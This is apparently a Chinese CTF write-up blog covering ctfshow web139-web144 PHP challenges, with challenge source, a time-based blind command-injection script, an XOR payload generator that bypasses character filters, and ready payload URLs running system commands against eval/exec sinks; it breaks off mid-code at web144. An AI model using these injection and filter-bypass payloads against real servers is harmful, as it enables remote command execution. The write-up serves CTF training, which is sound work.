<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, $x))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    check($c);</span><br><span class="line">    exec($c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>å’‹çœ‹å¥½ä¼¼å’Œä¹‹å‰çš„é¢˜æ²¡å˜åŒ–ï¼Œä½†å¥½åƒbanäº†å†™å…¥æ–‡ä»¶çš„æƒé™ï¼Œæ²¡æœ‰å›æ˜¾äº†ï¼Œåªèƒ½å¼€å§‹ç›²æ³¨äº†ï¼Œè¿™é‡Œå»äº†è§£äº†ä¸€ä¸‹shellç¼–ç¨‹ğŸ˜¿<br>
åˆ©ç”¨shellç¼–ç¨‹çš„ifåˆ¤æ–­è¯­å¥é…åˆawkä»¥åŠcutå‘½ä»¤æ¥è·å–flag<br>
awké€è¡Œè·å–æ•°æ®<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web139/U%60%7BH%5DKW%7D_79%60BM%25%40HSKF%259R.png" alt=""><br>
cutå‘½ä»¤é€åˆ—è·å–å•ä¸ªå­—ç¬¦<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web139/LES%24GLDZX%7D09Y03%7DAVE92_U.png" alt=""><br>
åˆ©ç”¨ifè¯­å¥æ¥åˆ¤æ–­å‘½ä»¤æ˜¯å¦æ‰§è¡Œ<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web139/%24FR_P%5D%5BX%5BYIWN%5DSNEO7GGD7.png" alt=""><br>
ç”¨å‘½ä»¤<code>ls \</code>æŸ¥çœ‹æ ¹ç›®å½•æ¥è·å–flagæ–‡ä»¶åï¼Œè„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/28 1:25</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://1bb8ea48-6413-47ef-94bb-8dd313c14c9e.chall.ctf.show:8080/&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">15</span>):</span><br><span class="line">        <span class="comment">#asciiç è¡¨</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">            k=chr(k)</span><br><span class="line">            payload = <span class="string">&quot;?c=&quot;</span> + <span class="string">f&quot;if [ `ls / | awk NR==<span class="subst">&#123;i&#125;</span> | cut -c <span class="subst">&#123;j&#125;</span>` == <span class="subst">&#123;k&#125;</span> ];then sleep 2;fi&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                requests.get(url=url+payload, timeout=(<span class="number">1.5</span>,<span class="number">1.5</span>))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                result = result + k</span><br><span class="line">                print(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    result += <span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web139/%7B7%5D%29%40V~%60CK9%5DLC1ZWF~%40L%28E.png" alt=""><br>
å‘ç°ä¸€ä¸ªæ–‡ä»¶åæ˜¯f149_15_h3r3çš„æ–‡ä»¶ï¼Œflagå°±åœ¨è¿™é‡Œè¾¹ï¼Œé‚£å°±æ”¹ä¸€ä¸‹è„šæœ¬catä¸€ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/28 1:25</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://1bb8ea48-6413-47ef-94bb-8dd313c14c9e.chall.ctf.show:8080/&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="comment">#asciiç è¡¨</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        k=chr(k)</span><br><span class="line">        payload = <span class="string">&quot;?c=&quot;</span> + <span class="string">f&quot;if [ `cat /f149_15_h3r3 | cut -c <span class="subst">&#123;j&#125;</span>` == <span class="subst">&#123;k&#125;</span> ];then sleep 2;fi&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.get(url=url+payload, timeout=(<span class="number">1.5</span>,<span class="number">1.5</span>))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            result = result + k</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">result += <span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web139/AK861%28EZ0%60FOYCLYCXS%29XYE.png" alt=""><br>
éœ€è¦åŠ ä¸Š<code>&#123;&#125;</code></p>
<h3 id="web140"><a class="header-anchor" href="#web140">Â¶</a>web140</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;f1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;f2&#x27;</span>]))&#123;</span><br><span class="line">    $f1 = (<span class="keyword">String</span>)$_POST[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line">    $f2 = (<span class="keyword">String</span>)$_POST[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, $f1))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, $f2))&#123;</span><br><span class="line">            $code = <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$f1</span>(<span class="subst">$f2</span>());&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(intval($code) == <span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æœ€åifåˆ¤æ–­å¼±æ¯”è¾ƒç­‰äºâ€œctfshowâ€çš„æ—¶å€™è¾“å‡ºflagï¼Œçœ‹ä¸€ä¸‹å¼±æ¯”è¾ƒå‚è€ƒè¡¨<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web140/QM41DXT%5BCS0X%7DUT%25P%29FY5BS.png" alt=""><br>
å¯ä»¥çœ‹åˆ°0å’Œå­—ç¬¦ä¸²è¿›è¡Œå¼±æ¯”è¾ƒçš„æ—¶å€™è¿”å›çš„æ˜¯trueï¼Œå› ä¸º<code>==</code>åœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå…ˆå°†å­—ç¬¦ä¸²ç±»å‹è½¬åŒ–æˆç›¸åŒï¼Œå†æ¯”è¾ƒï¼Œè€Œctfshowæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå’Œ0ç›¸æ¯”è¾ƒçš„æ—¶å€™è¦è½¬æ¢æˆæ•°å­—ï¼Œctfshowè½¬æ¢æˆæ•°å­—çš„æ—¶å€™æ˜¯0ï¼Œæ‰€ä»¥ç›¸ç­‰è¿”å›true<br>
è€Œintval()å‡½æ•°ä¼šå°†éæ•°å­—æˆ–éæ•°å­—å­—ç¬¦ä¸²è½¬æ¢ä¸º0ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„f1å’Œf2äº’ç›¸æ„é€ å³å¯ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªmd5ï¼Œè¿™æ ·intvalå°±ä¼šè¿”å›0<br>
æ‰€ä»¥payloadä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">postï¼š</span><br><span class="line">f1&#x3D;md5&amp;f2&#x3D;md5</span><br></pre></td></tr></table></figure>
<p>å³é”®æŸ¥çœ‹æºç å³å¯å¾—åˆ°flag</p>
<h3 id="web141"><a class="header-anchor" href="#web141">Â¶</a>web141</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    $v3 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^\W+$/&#x27;</span>, $v3))&#123;</span><br><span class="line">            $code =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>åˆ†ææºä»£ç ï¼Œè¿™é‡Œç”¨äº†æ­£åˆ™è¡¨è¾¾å¼<code>/^\W+$/</code>ï¼ŒæŠŠæ•°å­—å’Œå­—æ¯è¿˜æœ‰ä¸‹åˆ’çº¿ç»™banäº†ï¼Œä¹‹å‰æ— å­—æ¯æ•°å­—çš„webshellæˆ‘ä»¬ç”¨äº†æˆ–è¿ç®—ï¼Œè¿™æ¬¡ç”¨å¼‚æˆ–æ¥å§ï¼ˆæˆ–è¿ç®—ï¼Œå¼‚æˆ–ï¼Œå–åç­‰ç­‰éƒ½å¯ä»¥ï¼‰ï¼Œpythonè„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/10 12:56</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆå¯ç”¨çš„å­—ç¬¦</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_rce</span>():</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    preg = <span class="string">&#x27;[a-zA-Z0-9]&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (re.match(preg, chr(i), re.I) <span class="keyword">or</span> re.match(preg, chr(j), re.I)):</span><br><span class="line">                k = i ^ j</span><br><span class="line">                <span class="keyword">if</span> k &gt;= <span class="number">32</span> <span class="keyword">and</span> k &lt;= <span class="number">126</span>:</span><br><span class="line">                    a = <span class="string">&#x27;%&#x27;</span> + hex(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    b = <span class="string">&#x27;%&#x27;</span> + hex(j)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    result += (chr(k) + <span class="string">&#x27; &#x27;</span> + a + <span class="string">&#x27; &#x27;</span> + b + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    f = open(<span class="string">&#x27;xor_rce.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    f.write(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ ¹æ®è¾“å…¥çš„å‘½ä»¤åœ¨ç”Ÿæˆçš„txtä¸­è¿›è¡ŒåŒ¹é…</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = open(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    write_rce()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s1 = input(<span class="string">&quot;\n[+] your functionï¼š&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> s1 == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        s2 = input(<span class="string">&quot;[+] your commandï¼š&quot;</span>)</span><br><span class="line">        param = action(s1) + action(s2)</span><br><span class="line">        print(<span class="string">&quot;\n[*] result:\n&quot;</span> + param)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web141/GX%7BS4BP5%24%60LJP~5W%7B%25RQDY0.png" alt=""><br>
ç„¶åv1å’Œv2å°±éšæ„å¡«ï¼Œv3å¡«æ„é€ å‡ºçš„paylaodå³å¯ï¼Œä½†æ³¨æ„çš„æ˜¯è¿™é‡Œæœ‰ä¸ªreturnå¹²æ‰°ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åœ¨v3çš„payloadå‰è¾¹å’Œåé¢åŠ ä¸Šä¸€äº›å­—ç¬¦å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œä¾‹å¦‚<code>\+ - *</code> ç­‰ç­‰<br>
æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;*(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%0c%08&quot;^&quot;%60%7b&quot;);</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web141/%60%60%25%5DZ54%60~O2KZ%282%5BPAEV82W.png" alt=""><br>
çœ‹åˆ°flag.phpï¼Œå†ç”Ÿæˆä¸€æ¬¡payload<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web141/6_%5B%7BLHJB8QLF7J%2555H4GTYC.png" alt=""><br>
è·å–flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;*(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%08%01%03%00%06%0c%01%07%00%0b%08%0b&quot;^&quot;%7c%60%60%20%60%60%60%60%2e%7b%60%7b&quot;);</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web141/X2%28X%7B%5DSL%5B~ONE~%29%7D%2845B0%28X.png" alt=""></p>
<h3 id="web142"><a class="header-anchor" href="#web142">Â¶</a>web142</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric($v1))&#123;</span><br><span class="line">        $d = (<span class="keyword">int</span>)($v1 * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span>);</span><br><span class="line">        sleep($d);</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p><code>is_numeric()</code>å‡½æ•°åŒ¹é…ä¸ºæ•°å­—æˆ–è€…æ•°å­—å­—ç¬¦ä¸²çš„è¯ä¼šè¿”å›trueï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è¾“å…¥æ•°å­—å°±å¯ä»¥ï¼Œä½†ä¸‹é¢æœ‰ä¸ªsleepä¼‘çœ ï¼Œæ‰€ä»¥éœ€è¦ä¼ 0ï¼Œå¦åˆ™ç­‰åˆ°å¤©è’åœ°è€â€¦<br>
payloadä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v1&#x3D;0</span><br></pre></td></tr></table></figure>
<h3 id="web143"><a class="header-anchor" href="#web143">Â¶</a>web143</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    $v3 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>, $v3))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $code =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>åœ¨web141çš„åŸºç¡€ä¸Šå¤šbanæ‰ä¸€äº›å­—ç¬¦ï¼Œbanäº†å–åï¼Œä½†æ²¡banå¼‚æˆ–éœ€è¦çš„<code>^</code>ï¼Œæ‰€ä»¥è¿˜æ˜¯å¯ä»¥ç”¨web141çš„è„šæœ¬ï¼Œä¸è¿‡éœ€è¦æ”¹ä¸€ä¸‹è§„åˆ™</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/10 12:56</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆå¯ç”¨çš„å­—ç¬¦</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_rce</span>():</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    preg = <span class="string">&#x27;[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (re.match(preg, chr(i), re.I) <span class="keyword">or</span> re.match(preg, chr(j), re.I)):</span><br><span class="line">                k = i ^ j</span><br><span class="line">                <span class="keyword">if</span> k &gt;= <span class="number">32</span> <span class="keyword">and</span> k &lt;= <span class="number">126</span>:</span><br><span class="line">                    a = <span class="string">&#x27;%&#x27;</span> + hex(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    b = <span class="string">&#x27;%&#x27;</span> + hex(j)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    result += (chr(k) + <span class="string">&#x27; &#x27;</span> + a + <span class="string">&#x27; &#x27;</span> + b + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    f = open(<span class="string">&#x27;xor_rce.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    f.write(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ ¹æ®è¾“å…¥çš„å‘½ä»¤åœ¨ç”Ÿæˆçš„txtä¸­è¿›è¡ŒåŒ¹é…</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = open(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    write_rce()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s1 = input(<span class="string">&quot;\n[+] your functionï¼š&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> s1 == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        s2 = input(<span class="string">&quot;[+] your commandï¼š&quot;</span>)</span><br><span class="line">        param = action(s1) + action(s2)</span><br><span class="line">        print(<span class="string">&quot;\n[*] result:\n&quot;</span> + param)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web143/%2575A4LJ6O_8TTQ_H%60RJU%25PI.png" alt=""><br>
è®°ä½ï¼Œv3è¿™é‡Œéœ€è¦å‰ååŠ ä¸Šç¬¦å·æ‹œæ‰˜æ‰returnï¼Œæœ€ç»ˆpayloadå¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0c%0c&quot;^&quot;%60%7f&quot;)*</span><br></pre></td></tr></table></figure>
<h3 id="web144"><a class="header-anchor" href="#web144">Â¶</a>web144</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    $v3 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(is_numeric($v1) &amp;&amp; check($v3))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^\W+$/&#x27;</span>, $v2))&#123;</span><br><span class="line">            $code =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span 